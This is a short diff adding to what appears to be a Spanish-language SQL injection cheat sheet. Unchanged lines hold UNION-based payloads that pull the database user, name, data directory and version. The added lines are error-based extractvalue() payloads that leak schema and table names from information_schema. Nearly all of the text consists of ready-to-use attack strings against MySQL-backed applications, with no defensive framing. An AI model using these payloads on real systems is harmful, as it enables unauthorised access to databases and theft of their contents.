@@ -13,3 +13,7 @@ select * from <nombre_tabla> where param_name='toto' union select user(),databas
 # Mas information
 select * from <nombre_tabla> where param_name='toto' union select user(),database(),@@datadir;
 select * from <nombre_tabla> where param_name='toto' union select user(),database(),@@version;
+
+# Error based injeccion, esta afichara informacion en el error sql generado
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 18,1)))-- -
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES LIMIT 5,1)))-- -
